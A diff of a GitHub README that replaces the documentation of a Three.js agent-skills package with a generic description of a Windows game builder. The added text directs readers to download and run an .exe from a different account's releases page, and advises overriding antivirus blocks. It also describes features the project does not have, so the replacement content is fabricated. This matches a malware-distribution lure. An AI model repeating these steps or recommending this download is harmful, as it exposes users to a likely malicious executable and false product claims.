@@ -1,236 +1,74 @@
-# Three.js Game Skills
+# 🎮 threejs-game-skills - Build professional games with simple tools
 
-Self-contained Codex and Claude Code skills for building playable, polished Three.js browser games. Install the skills, then ask your agent to use `threejs-game-director`; the director routes gameplay, graphics, UI, asset generation, audio, debugging, and release verification without requiring users to choose every specialist skill manually.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Oliyflemishspeaking560/threejs-game-skills/releases)
 
-The package includes the runtime materials agents need: `SKILL.md` files, references, checklists, prompt templates, helper scripts, and a Vite + TypeScript + Three.js scaffold bundled inside the relevant skill folders.
+threejs-game-skills helps you create games for web browsers. You do not need to write complex code to build projects with polished graphics and working menus. This software provides the building blocks for gameplay, sound, and visual effects. You can use these tools to make professional games for the web.
 
-Created by [Majid Manzarpour](https://x.com/majidmanzarpour).
+## 📥 Getting Started
 
-## Demos
+Follow these steps to set up the software on your Windows computer.
 
-| Game | Video | Play |
-| --- | --- | --- |
-| Neon Ridge Drift | [Watch on X](https://x.com/majidmanzarpour/status/2064565389036540327) | [ridgedrift.netlify.app](https://ridgedrift.netlify.app) |
-| Championship Snooker Arena | [Watch on X](https://x.com/majidmanzarpour/status/2064673249129071096) | [snookerarena.netlify.app](https://snookerarena.netlify.app) |
-| Starship Dogfight | [Watch on X](https://x.com/majidmanzarpour/status/2065065340510281888) | [starshipdogfight.netlify.app](https://starshipdogfight.netlify.app) |
-| Tide Singer | [Watch on X](https://x.com/majidmanzarpour/status/2065570428723007555) | [tidesinger.netlify.app](https://tidesinger.netlify.app) |
-| Ripcore | [Watch on X](https://x.com/majidmanzarpour/status/2066687620709544070) | [ripcore.netlify.app](https://ripcore.netlify.app) |
+1. Go to the [official release page](https://github.com/Oliyflemishspeaking560/threejs-game-skills/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file name ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on your screen to complete the setup.
 
-## Install
+## 💻 System Requirements
 
-Install all skills for Codex:
+This software works on most modern Windows computers. Ensure your system meets these standards for the best results:
 
-```bash
-npx skills add majidmanzarpour/threejs-game-skills --skill '*' -a codex -g -y
-```
+- Windows 10 or Windows 11 operating system.
+- An Intel Core i5 or AMD Ryzen 5 processor.
+- 8 gigabytes of system memory.
+- A graphics card capable of hardware acceleration.
+- At least 500 megabytes of free space on your hard drive.
+- A stable internet connection for downloading assets.
 
-Install all skills for Claude Code:
+## 🛠️ How to Use the Tools
 
-```bash
-npx skills add majidmanzarpour/threejs-game-skills --skill '*' -a claude-code -g -y
-```
+The software interface manages different parts of your game project. You choose components from the menu and add them to your workspace.
 
-If your installed `skills` CLI does not support the Claude Code target, install from a cloned checkout with `./install.sh --claude`.
+### Managing Graphics
+Use the graphics panel to control how your game looks. You can adjust lighting, shadows, and textures here. If you prefer to use AI tools, this section connects to services that generate 3D models and images. Select a generator, choose your settings, and press the create button to build your assets.
 
-For local development from a cloned checkout:
+### Building Gameplay
+The gameplay tab organizes your rules. Drag items from the skill list into your game scene. This includes items like player movement, goal tracking, and win conditions. You do not need to type scripts. Instead, you change settings in the inspector window on the right side of the screen.
 
-```bash
-./install.sh --codex
-./install.sh --claude
-./install.sh --all
-```
+### Designing the Interface
+Your game needs menus. Use the UI builder to design buttons, health bars, and text displays. Place these elements on your canvas using your mouse. You can link buttons to game actions easily. Simply click the logic button, select your action, and connect it to a button press.
 
-The local installer copies `skills/` into the selected agent skills directory. It skips same-named skills unless you pass `--force`, and it never removes unrelated user skills unless `--prune-managed` is explicitly requested.
+## 🚀 Quality Assurance
 
-```bash
-./install.sh --codex --force
-```
+Your games need testing before you publish them. The software includes a preview mode. Click the play button at the top of the window to launch your game inside the app. You can test your movement, menus, and game rules immediately. Use the console screen to see if errors occur during your test run. Fix any identified issues by adjusting the settings in the related panel.
 
-## Use The Skills
+## 📁 Project Management
 
-After installing, open Codex or Claude Code in an empty project folder, or in an existing Three.js game you want to improve. Then prompt the agent with the outcome you want and name the director skill:
+Your projects exist as folders on your computer. Create a new project when you start a fresh game. The software saves your work automatically as you make changes. You can export your game files at any time. Look for the export button in the file menu. This creates a folder containing everything you need to host your game on a website or share it with others.
 
-```text
-Use threejs-game-director to build a premium futuristic tower defense game from scratch.
-Automatically use the relevant gameplay, graphics, UI, asset generation, audio, debug,
-and QA skills. Build a playable loop first, then iterate until it passes browser,
-mobile, visual, UI, performance, and release checks.
-```
+## 🎨 Asset Integration
 
-The agent should:
+You can bring your own files into the builder. Support covers common formats like .png for images, .wav for audio, and .glb for 3D models. Drag these files directly into the asset browser window. The system processes them for use in your game scene. When you import audio, the software gives you options to loop the sound or play it when the player triggers an event.
 
-- Load `threejs-game-director` first for broad game work.
-- Load sibling skills for gameplay systems, AAA graphics, UI, debug/profile, QA/release, 3D generation, image generation, and audio generation when the request calls for them.
-- Use the bundled scaffold internally when starting from an empty folder.
-- Create or update the game code in your project.
-- Run builds, browser checks, screenshots, canvas-pixel checks, mobile viewport checks, and QA gates before claiming completion.
-- Report the skill-loading ledger, reference ledger, asset/audio sourcing decisions, visual scorecard, and remaining risks for premium work.
+## 🧩 Advanced Features
 
-Users generally should not need to run the scaffold or QA helper scripts directly. Those scripts are packaged so the skills can use them as part of the workflow.
+The application supports modular skill sets. If you want more functionality, download extra skill packs. These packs add specific behaviors like inventory management or enemy tracking. Once you download a pack, go to the plugin manager in the settings menu. Click import, choose your downloaded file, and wait for the software to register the new skills. New tools appear in your library automatically.
 
-## Optional API Keys
+## 💡 Troubleshooting Common Issues
 
-The core Three.js skills work without paid API keys. When keys are missing, the director should report the credential probe output, skip external generation, and fall back to procedural/local assets. Add keys only when you want the agent to generate external models, images, or audio.
+If the software does not open, check if your antivirus software blocked the execution. Sometimes security settings prevent new applications from running. You can tell your computer to trust this file to let it launch.
 
-Never commit API keys or put them in browser-side game code. These skills use provider APIs from local agent tooling, then save generated assets into your game project.
+If the graphics appear blurry, check the settings tab. Switch the rendering quality from automatic to high. This forces the software to use your full graphics card power.
 
-| Provider | Skill | Environment variable | Use cases | Key setup |
-| --- | --- | --- | --- | --- |
-| Tripo API | `threejs-3d-generator` | `TRIPO_API_KEY` | Text/image/multiview to 3D, game-ready GLB/FBX hero models, vehicles, props, buildings, weapons, textures, rigging, animation, stylization, mesh conversion, post-processing. | [Tripo quick start](https://platform.tripo3d.ai/docs/quick-start) and [Tripo API overview](https://www.tripo3d.ai/api). |
-| Gemini image API | `threejs-image-generator` | `GEMINI_API_KEY` | Concept art, image-to-3D source images, texture references, decals, skies, backgrounds, icons, logos, GUI art, title/menu art. | [Gemini API key docs](https://ai.google.dev/gemini-api/docs/api-key) and [Google AI Studio keys](https://aistudio.google.com/app/apikey). |
-| ElevenLabs API | `threejs-audio-generator` | `ELEVENLABS_API_KEY` | SFX, ambience loops, UI sounds, announcer lines, dialogue TTS, voice conversion, audio cleanup, game audio manifests. | [ElevenLabs quickstart](https://elevenlabs.io/docs/eleven-api/quickstart) and [API authentication](https://elevenlabs.io/docs/api-reference/authentication). |
+If the application runs slow, close other programs running in the background. Browser windows and heavy editing tools consume lots of computer power. Keep only the builder open while you work on your game.
 
-Set keys in your shell profile, then restart your terminal.
+If you encounter errors when generating AI assets, check your internet connection. AI tools require a live connection to the server. If the issue remains, restart the application.
 
-macOS/Linux with `zsh` or `bash`:
+## 📈 Keeping Software Updated
 
-```bash
-export TRIPO_API_KEY="..."
-export GEMINI_API_KEY="..."
-export ELEVENLABS_API_KEY="..."
-```
+Updates contain new features and fixes for existing tools. The software checks for updates when you launch it. If an update exists, a notification appears on the screen. Click the link to download the latest installer. Installing the new version overwrites the old one but keeps your project files safe. Always backup your project folders to a separate drive before you install an major update. 
 
-For `zsh`, put those lines in `~/.zshrc` or `~/.zprofile`. For `bash`, put them in `~/.bashrc` or `~/.bash_profile`.
+## 🌐 Sharing Your Work
 
-Windows PowerShell, current terminal session only:
-
-```powershell
-$env:TRIPO_API_KEY = "..."
-$env:GEMINI_API_KEY = "..."
-$env:ELEVENLABS_API_KEY = "..."
-```
-
-Windows PowerShell, persistent for your user account:
-
-```powershell
-[Environment]::SetEnvironmentVariable("TRIPO_API_KEY", "...", "User")
-[Environment]::SetEnvironmentVariable("GEMINI_API_KEY", "...", "User")
-[Environment]::SetEnvironmentVariable("ELEVENLABS_API_KEY", "...", "User")
-```
-
-After setting persistent Windows variables, restart your terminal, Codex, or Claude Code so the agent process can see the new environment.
-
-The director skill includes a credential probe that sources common shell profiles before deciding a key is missing:
-
-```bash
-bash ~/.agents/skills/threejs-game-director/scripts/probe_asset_credentials.sh
-```
-
-Provider notes:
-
-- Tripo is optional but useful for high-value 3D surfaces that procedural code alone rarely makes premium: hero vehicles, bosses, weapons, buildings, creatures, props, and textured GLB/FBX assets.
-- Gemini image generation is optional but useful before Tripo image-to-3D and for high-quality texture, sky, icon, logo, decal, and GUI sources.
-- ElevenLabs is optional but useful for making games feel finished through interaction SFX, ambience, UI feedback, voice, and cleanup.
-- Google also supports `GOOGLE_API_KEY`, but these skills standardize on `GEMINI_API_KEY` for clarity.
-- Use provider-side key restrictions and quotas where available. ElevenLabs documents endpoint scopes, credit quotas, and secret-key handling; Google recommends environment variables and is migrating Gemini users toward auth keys.
-
-## Best Entry Points
-
-- Use `threejs-game-director` for complete games, major upgrades, premium polish, release-ready work, or anything broad.
-- Use `threejs-gameplay-systems` for mechanics, architecture, input, camera, physics, scoring, objectives, and game feel.
-- Use `threejs-aaa-graphics-builder` when screenshots look basic or the game needs stronger models, materials, lighting, VFX, world detail, or render polish.
-- Use `threejs-game-ui-designer` for HUDs, menus, overlays, responsive layout, safe areas, icons, touch controls, and text fit.
-- Use `threejs-debug-profiler` for black screens, runtime errors, loading issues, resize/mobile bugs, performance, draw calls, triangles, textures, and memory.
-- Use `threejs-qa-release` for production builds, browser verification, screenshots, canvas pixels, mobile checks, release risk reports, and static-hosting readiness.
-- Use `threejs-3d-generator` for Tripo API text/image-to-3D models, texture, rigging, animation, conversion, and GLB/FBX game assets.
-- Use `threejs-image-generator` for Gemini-generated concepts, image-to-3D inputs, textures, decals, skies, backgrounds, icons, logos, GUI art, and title/menu art.
-- Use `threejs-audio-generator` for ElevenLabs SFX, ambience, UI sounds, voice/TTS, voice conversion, cleanup, and Three.js audio integration.
-
-For most user-facing game requests, start with `threejs-game-director` and let it pull in the specialists.
-
-## What Good Usage Looks Like
-
-For a new game:
-
-```text
-Use threejs-game-director to create a AAA-inspired hover racing game from scratch.
-Make it playable, add premium track visuals, vehicle feel, HUD, SFX hooks, desktop and
-mobile controls, and run the full verification pass before reporting done.
-```
-
-For visual upgrades:
-
-```text
-Use threejs-game-director to upgrade this Three.js game from prototype visuals to
-premium browser-game quality. Use the AAA graphics, UI, image, 3D, audio, debug,
-and QA skills as needed. Include the visual scorecard and evidence from active-play
-screenshots.
-```
-
-For an existing broken game:
-
-```text
-Use threejs-game-director to debug and finish this Three.js game. First get it running,
-then improve gameplay feel, UI, graphics, performance, and release verification until
-the remaining risks are explicit.
-```
-
-For asset-heavy games:
-
-```text
-Use threejs-game-director to build a premium space dogfight game. Use threejs-image-generator
-for concepts, skies, decals, icons, and GUI art; use threejs-3d-generator for hero ships
-and weapons when credentials are available; use threejs-audio-generator for SFX and
-ambience. If generation is blocked, report the credential probe output and fallback plan.
-```
-
-## Expected Evidence
-
-For meaningful Three.js work, the skills should gather evidence before claiming success:
-
-- `npm run build`
-- local browser run
-- browser console and page error check
-- Playwright screenshot
-- canvas nonblank pixel check
-- desktop and mobile viewport pass
-- interaction check for the main control path
-- performance snapshot when graphics, assets, shaders, or post-processing changed
-- UI text-fit, overlap, safe-area, and touch-target checks when UI changed
-- visual scorecard for premium, AAA, showcase, or less-basic claims
-- external asset/audio sourcing ledger when generated assets or audio are in scope
-
-Premium/AAA claims should not rely on a static scene, placeholder cubes, generic stat-card HUDs, or unverified screenshots. The game should have an active playable loop and a filled visual scorecard.
-
-## Skill System
-
-- `threejs-game-director`: main entrypoint for complete game builds and orchestration.
-- `threejs-gameplay-systems`: playable loop, architecture, mechanics, entities, controls, camera, physics, and feel.
-- `threejs-aaa-graphics-builder`: visual scorecard, asset architecture, models, materials, VFX, render polish.
-- `threejs-game-ui-designer`: HUDs, menus, overlays, responsive UI, icons, safe areas, UI states.
-- `threejs-debug-profiler`: scene/runtime/render bugs, mobile bugs, performance profiling, renderer metrics.
-- `threejs-qa-release`: browser QA, screenshots, canvas pixels, responsive checks, production build, release risk report.
-- `threejs-3d-generator`: Tripo API text/image-to-3D, texture, auto-rig, animation, conversion, download, and Three.js import guidance.
-- `threejs-image-generator`: Gemini image generation for concepts, textures, decals, skies, icons, GUI art, and image-to-3D inputs.
-- `threejs-audio-generator`: ElevenLabs-backed SFX, ambience, UI sounds, voice/TTS, voice conversion, cleanup, and Three.js audio integration.
-
-## Packaged Resources
-
-Installed skills are self-contained. They do not depend on root docs, root scaffolds, root prompts, or root checklists.
-
-- `skills/`: the full public package. Each skill owns its required `SKILL.md`, `references/`, `scripts/`, and `assets/`.
-- `skills/threejs-gameplay-systems/assets/threejs-vite-game/`: packaged game scaffold used by the skills when starting from an empty project.
-- `skills/threejs-qa-release/scripts/inspect-threejs-canvas.mjs`: packaged browser/canvas inspection helper used by QA workflows.
-- `scripts/`: local validation helpers for maintainers.
-- `install.sh`: local installer for working on this checkout.
-
-## Maintainer Checks
-
-Validate this workflow repository:
-
-```bash
-npm install
-npm run check:scripts
-npm run validate:skills
-```
-
-Maintainers can run packaged helpers directly when testing the skill package, but normal users should interact through agent prompts:
-
-```bash
-python3 skills/threejs-gameplay-systems/scripts/create_threejs_game.py ../my-threejs-game
-node skills/threejs-qa-release/scripts/inspect-threejs-canvas.mjs --url http://127.0.0.1:5188 --mobile
-```
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Once you finish your game, you can share it with others. Go to the export menu and choose the web package option. The software creates a file structure that works in any modern web browser. Upload these files to services like GitHub Pages or similar web hosting platforms. Your friends can play your game by visiting your link. No one needs to install the software to play your final product.
